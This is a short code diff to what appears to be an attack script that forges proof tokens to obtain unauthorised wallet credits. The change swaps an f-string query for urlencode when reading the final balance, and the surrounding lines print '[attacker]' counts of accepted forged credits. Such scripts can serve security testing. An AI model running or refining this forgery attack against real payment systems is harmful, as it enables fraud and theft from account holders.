@@ -25,6 +25,7 @@ import argparse
 import json
 import secrets
 import urllib.request
+from urllib.parse import urlencode
 
 
 def forge_proof_token() -> str:
@@ -82,7 +83,10 @@ def main() -> int:
             successes += 1
             expected_gain += args.amount
 
-    final = get_json(f"{args.url}/wallet/balance?account_id={args.account}")
+    # urlencode, not an f-string — an account id containing "+" or a space
+    # would otherwise be decoded differently (or rejected outright) than the
+    # literal string the POST above just credited under.
+    final = get_json(f"{args.url}/wallet/balance?{urlencode({'account_id': args.account})}")
     total = final["balance_minor"]
     print(f"\n[attacker] {successes}/{args.rounds} forged credit(s) were accepted by the target.")
     print(f"[attacker] Final balance for '{args.account}': {total} minor units "
